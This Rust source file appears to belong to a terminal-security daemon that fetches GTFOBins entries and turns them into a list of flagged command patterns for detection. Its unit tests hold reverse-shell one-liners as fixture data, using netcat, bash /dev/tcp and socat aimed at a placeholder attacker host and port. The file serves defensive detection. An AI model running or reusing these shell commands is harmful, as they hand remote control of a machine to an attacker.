//! V2-I daemon-internal atom fetcher.
//!
//! Pulls IOC corpora from configurable upstream sources, parses
//! them into atom strings, and writes a refreshed
//! `flagged_atoms.txt` into the atty-guard data dir.
//!
//! Two operating modes:
//!
//!   - **One-shot CLI**: `atty-guard atoms update [--source NAME]`.
//!     Fetches the configured sources synchronously, writes the
//!     merged atom set, exits.
//!
//!   - **Cron**: `atty-guard --atoms-update-interval 6h` runs the
//!     daemon AND spawns a background thread that re-runs the
//!     fetch every interval. Failed fetches log + continue; the
//!     last good `flagged_atoms.txt` stays in place.
//!
//! Output location: `$XDG_DATA_HOME/atty-guard/flagged_atoms.txt`
//! (or `$HOME/.local/share/atty-guard/flagged_atoms.txt`). The
//! AtomMatcher loads from the bundled file by default; future work
//! will check the user data dir first so a fetched corpus wins
//! over the static bundle.
//!
//! Source registry (this PR ships GTFOBins; Sigma + LOLBAS land
//! next as separate parser impls behind the same `Source` enum):
//!
//!   - **GTFOBins** — handcurated Linux LOLBAS corpus. ~50 binaries
//!     each with a YAML-fronted markdown manifest. We grab the
//!     repo tarball, walk `_gtfobins/*.md`, extract the
//!     `functions.shell` / `functions.bind-shell` / etc. command
//!     fragments. Small (~150 atoms), high signal.
//!
//! Feature-gated behind `atoms-fetch` so default builds don't
//! pull `flate2` + `tar` + `serde_yaml`.

use std::path::{Path, PathBuf};
use std::time::Duration;

/// Source ID for CLI selection + telemetry. New sources land
/// as additional variants here; the dispatch in `fetch_one` adds
/// a match arm with the source-specific parser.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceId {
    Gtfobins,
    // Sigma  — V2-I-2 (next PR).
    // Lolbas — V2-I-3.
}

impl SourceId {
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "gtfobins" => Some(SourceId::Gtfobins),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            SourceId::Gtfobins => "gtfobins",
        }
    }

    /// All sources enabled by default. Used by the no-arg
    /// `atty-guard atoms update` form.
    pub fn default_enabled() -> &'static [SourceId] {
        &[SourceId::Gtfobins]
    }
}

/// Configuration knobs for the fetcher. Held by the daemon's
/// shared state; the cron thread reads it on each tick.
#[derive(Debug, Clone)]
pub struct FetcherConfig {
    /// Where the fetched atom set lands. Defaults to
    /// `$XDG_DATA_HOME/atty-guard/flagged_atoms.txt`.
    pub output_path: PathBuf,
    /// Per-source HTTP timeout — tarballs are typically ~1-2 MB
    /// each, so a 30 s budget is comfortable on slow connections
    /// but bails fast on a wedged endpoint.
    pub timeout: Duration,
    /// User-agent string sent with every request. Identifies
    /// atty-guard cleanly in upstream logs (GTFOBins / SigmaHQ
    /// have requested polite UA strings in their READMEs).
    pub user_agent: String,
}

impl Default for FetcherConfig {
    fn default() -> Self {
        Self {
            output_path: default_atoms_path(),
            timeout: Duration::from_secs(30),
            user_agent: format!("atty-guard/{} (+https://github.com/fentas/atty)", env!("CARGO_PKG_VERSION")),
        }
    }
}

/// Resolve the data directory the fetched atoms file lives under.
/// `XDG_DATA_HOME` wins; otherwise `$HOME/.local/share`.
pub fn default_atoms_path() -> PathBuf {
    let base = std::env::var_os("XDG_DATA_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local").join("share")))
        .unwrap_or_else(|| PathBuf::from("/var/lib"));
    base.join("atty-guard").join("flagged_atoms.txt")
}

#[derive(Debug)]
pub enum FetchError {
    FeatureNotBuilt,
    NetworkError(String),
    DecompressError(String),
    ParseError(String),
    WriteError(String),
}

impl std::fmt::Display for FetchError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FetchError::FeatureNotBuilt => write!(
                f,
                "atoms-fetch feature not built — rebuild with `cargo build --features atoms-fetch`"
            ),
            FetchError::NetworkError(s) => write!(f, "network error: {s}"),
            FetchError::DecompressError(s) => write!(f, "decompress error: {s}"),
            FetchError::ParseError(s) => write!(f, "parse error: {s}"),
            FetchError::WriteError(s) => write!(f, "write error: {s}"),
        }
    }
}

impl std::error::Error for FetchError {}

/// Summary of one fetch pass — what was tried, what landed, how
/// many atoms surfaced per source. Returned from `fetch_all` so
/// the daemon's log can show a one-line "refreshed N atoms from
/// M sources" message.
#[derive(Debug, Clone, Default)]
pub struct FetchReport {
    pub atoms_total: usize,
    pub per_source: Vec<(SourceId, Result<usize, String>)>,
}

// ===========================================================================
// Feature-OFF stub.

#[cfg(not(feature = "atoms-fetch"))]
pub fn fetch_all(_cfg: &FetcherConfig, _sources: &[SourceId]) -> Result<FetchReport, FetchError> {
    Err(FetchError::FeatureNotBuilt)
}

#[cfg(not(feature = "atoms-fetch"))]
pub fn spawn_periodic_refresh(_cfg: FetcherConfig, _sources: Vec<SourceId>, _interval: Duration) {
    // No-op in builds without the feature. main.rs logs the
    // FeatureNotBuilt and continues with the bundled atoms.
}

// ===========================================================================
// Feature-ON impl.

#[cfg(feature = "atoms-fetch")]
mod imp {
    use super::*;
    use std::collections::BTreeSet;
    use std::io::Read;

    /// Top-level entry point. Walks each requested source, merges
    /// the per-source atom sets into one deduped `BTreeSet` (stable
    /// order in the output file), and atomically writes
    /// `flagged_atoms.txt` via tmp+rename.
    ///
    /// Each source failure is captured in `FetchReport.per_source`
    /// — one bad source doesn't fail the whole refresh.
    pub fn fetch_all(cfg: &FetcherConfig, sources: &[SourceId]) -> Result<FetchReport, FetchError> {
        let mut all_atoms: BTreeSet<String> = BTreeSet::new();
        let mut report = FetchReport::default();

        for sid in sources {
            match fetch_one(cfg, *sid) {
                Ok(atoms) => {
                    let n = atoms.len();
                    all_atoms.extend(atoms);
                    report.per_source.push((*sid, Ok(n)));
                }
                Err(e) => {
                    report.per_source.push((*sid, Err(e.to_string())));
                }
            }
        }

        report.atoms_total = all_atoms.len();
        write_atoms(&cfg.output_path, &all_atoms)?;
        Ok(report)
    }

    fn fetch_one(cfg: &FetcherConfig, source: SourceId) -> Result<Vec<String>, FetchError> {
        match source {
            SourceId::Gtfobins => fetch_gtfobins(cfg),
        }
    }

    /// Walk GTFOBins's repo tarball, extract every `_gtfobins/*.md`
    /// file's YAML front-matter, pull command fragments out of the
    /// `functions.shell` / `bind-shell` / `reverse-shell` / etc.
    /// blocks. Each fragment is normalised + truncated to the
    /// first line (atoms are single-line by definition).
    fn fetch_gtfobins(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
        const URL: &str =
            "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master";

        let agent = ureq::AgentBuilder::new()
            .timeout(cfg.timeout)
            .user_agent(&cfg.user_agent)
            .build();
        let resp = agent
            .get(URL)
            .call()
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;
        let mut buf = Vec::with_capacity(2 * 1024 * 1024);
        resp.into_reader()
            .read_to_end(&mut buf)
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;

        let gz = flate2::read::GzDecoder::new(buf.as_slice());
        let mut ar = tar::Archive::new(gz);
        let mut atoms: BTreeSet<String> = BTreeSet::new();

        for entry in ar
            .entries()
            .map_err(|e| FetchError::DecompressError(e.to_string()))?
        {
            let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
            let path = match entry.path() {
                Ok(p) => p.into_owned(),
                Err(_) => continue,
            };
            // The repo's binary docs live under
            // `GTFOBins.github.io-master/_gtfobins/*.md`.
            let path_str = path.to_string_lossy();
            if !path_str.contains("/_gtfobins/") || !path_str.ends_with(".md") {
                continue;
            }
            let mut content = String::new();
            if entry.read_to_string(&mut content).is_err() {
                continue;
            }
            extract_gtfobins_atoms(&content, &mut atoms);
        }

        Ok(atoms.into_iter().collect())
    }

    /// Parse one GTFOBins markdown file's YAML front-matter and
    /// pull command fragments. The file shape is:
    /// ```text
    /// ---
    /// functions:
    ///   shell:
    ///     - code: |
    ///         <command>
    /// ---
    /// ```
    /// We extract every `code` scalar, take its first line, trim.
    /// Atom rules (≥3 chars, no leading `#`) apply at write time.
    fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
        // Front-matter is delimited by `---` lines. Most files
        // open with `---` on line 1.
        let after_open = match content.split_once("---") {
            Some((_, rest)) => rest,
            None => return,
        };
        let yaml = match after_open.split_once("\n---") {
            Some((y, _)) => y,
            None => after_open,
        };
        let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
            Ok(v) => v,
            Err(_) => return,
        };
        let funcs = match parsed.get("functions").and_then(|f| f.as_mapping()) {
            Some(m) => m,
            None => return,
        };
        for (_func_name, func_val) in funcs {
            let arr = match func_val.as_sequence() {
                Some(a) => a,
                None => continue,
            };
            for entry in arr {
                let code = match entry.get("code").and_then(|c| c.as_str()) {
                    Some(s) => s,
                    None => continue,
                };
                if let Some(atom) = atom_from_code(code) {
                    atoms.insert(atom);
                }
            }
        }
    }

    /// Turn a GTFOBins `code` scalar into a single atom string.
    /// We take the first non-blank line, strip leading whitespace
    /// (markdown YAML scalars carry indentation), and refuse
    /// atoms < 3 chars or > 60 chars (too short = noise, too long
    /// = better suited to a regex rule).
    fn atom_from_code(code: &str) -> Option<String> {
        for line in code.lines() {
            let t = line.trim();
            if t.is_empty() {
                continue;
            }
            if t.len() < 3 || t.len() > 60 {
                return None;
            }
            // Drop trailing `# example` comments — they're docs,
            // not atom content.
            let clean = match t.find(" #") {
                Some(i) => &t[..i],
                None => t,
            };
            return Some(clean.trim().to_owned());
        }
        None
    }

    /// Atomic write: tmp file in the same dir + rename. Reader
    /// (the AtomMatcher loader) never sees a half-written file.
    fn write_atoms(path: &Path, atoms: &BTreeSet<String>) -> Result<(), FetchError> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)
                .map_err(|e| FetchError::WriteError(format!("mkdir -p {parent:?}: {e}")))?;
        }
        let tmp = path.with_extension("txt.tmp");
        let header = "# atty-guard auto-fetched atom set.\n# Generated by `atty-guard atoms update`. Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo) stays the source of\n# truth; this file lives in $XDG_DATA_HOME/atty-guard and only\n# carries data pulled from upstream IOC corpora.\n";
        let mut content = String::with_capacity(header.len() + atoms.len() * 32);
        content.push_str(header);
        for a in atoms {
            content.push_str(a);
            content.push('\n');
        }
        std::fs::write(&tmp, content)
            .map_err(|e| FetchError::WriteError(format!("write {tmp:?}: {e}")))?;
        std::fs::rename(&tmp, path)
            .map_err(|e| FetchError::WriteError(format!("rename → {path:?}: {e}")))?;
        Ok(())
    }

    /// Spawn the cron-style background refresh. Sleeps the
    /// interval, fetches, logs, repeats. Failures don't abort
    /// the thread — the next interval gets another shot.
    pub fn spawn_periodic_refresh(
        cfg: FetcherConfig,
        sources: Vec<SourceId>,
        interval: Duration,
    ) {
        std::thread::Builder::new()
            .name("atty-guard-atoms-refresh".into())
            .spawn(move || loop {
                std::thread::sleep(interval);
                match fetch_all(&cfg, &sources) {
                    Ok(report) => {
                        eprintln!(
                            "atty-guard: atom refresh ok — {} atoms across {} sources",
                            report.atoms_total,
                            report.per_source.len()
                        );
                    }
                    Err(e) => {
                        eprintln!("atty-guard: atom refresh failed — {e}");
                    }
                }
            })
            .ok();
    }

    #[cfg(test)]
    mod imp_tests {
        use super::*;

        #[test]
        fn atom_from_code_picks_first_nonblank_line() {
            let code = "\n\nnc -e /bin/sh ATTACKER PORT\n";
            assert_eq!(
                atom_from_code(code).as_deref(),
                Some("nc -e /bin/sh ATTACKER PORT")
            );
        }

        #[test]
        fn atom_from_code_strips_trailing_doc_comment() {
            let code = "bash -i  # spawn an interactive shell";
            assert_eq!(atom_from_code(code).as_deref(), Some("bash -i"));
        }

        #[test]
        fn atom_from_code_rejects_too_long() {
            let s = "a".repeat(100);
            assert!(atom_from_code(&s).is_none());
        }

        #[test]
        fn atom_from_code_rejects_too_short() {
            assert!(atom_from_code("hi").is_none());
        }

        #[test]
        fn extract_gtfobins_parses_canonical_yaml() {
            // Minimal example modelled after the real GTFOBins
            // front-matter shape.
            let doc = r#"---
description: "demo"
functions:
  shell:
    - code: |
        nc -e /bin/sh 10.0.0.1 4444
    - code: |
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  reverse-shell:
    - code: |
        socat - tcp:10.0.0.1:4444 exec:bash
---
# rest of markdown
"#;
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(atoms.iter().any(|a| a.contains("nc -e")));
            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
            assert!(atoms.iter().any(|a| a.starts_with("socat")));
        }

        #[test]
        fn write_atoms_roundtrips_via_tmp_rename() {
            let dir = std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
            let path = dir.join("flagged_atoms.txt");
            let mut s = BTreeSet::new();
            s.insert("nc -e /bin/sh".to_owned());
            s.insert("/dev/tcp/".to_owned());
            write_atoms(&path, &s).unwrap();
            let read = std::fs::read_to_string(&path).unwrap();
            assert!(read.contains("nc -e"));
            assert!(read.contains("/dev/tcp/"));
            std::fs::remove_dir_all(&dir).ok();
        }
    }
}

#[cfg(feature = "atoms-fetch")]
pub use imp::{fetch_all, spawn_periodic_refresh};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn source_id_parse() {
        assert_eq!(SourceId::parse("gtfobins"), Some(SourceId::Gtfobins));
        assert_eq!(SourceId::parse("unknown"), None);
        assert_eq!(SourceId::parse(""), None);
    }

    #[test]
    fn source_id_name_round_trip() {
        for sid in SourceId::default_enabled() {
            assert!(SourceId::parse(sid.name()).is_some());
        }
    }

    #[test]
    fn default_atoms_path_under_xdg_or_home() {
        let p = default_atoms_path();
        assert!(p.ends_with("flagged_atoms.txt"));
        assert!(p.to_string_lossy().contains("atty-guard"));
    }

    #[test]
    fn fetch_error_display_includes_hint() {
        let e = FetchError::FeatureNotBuilt;
        let s = format!("{e}");
        assert!(s.contains("atoms-fetch"));
    }

    #[cfg(not(feature = "atoms-fetch"))]
    #[test]
    fn fetch_without_feature_errors_cleanly() {
        match fetch_all(&FetcherConfig::default(), &[SourceId::Gtfobins]) {
            Err(FetchError::FeatureNotBuilt) => {}
            Ok(_) => panic!("expected FeatureNotBuilt on default build"),
            Err(other) => panic!("expected FeatureNotBuilt, got {other}"),
        }
    }
}
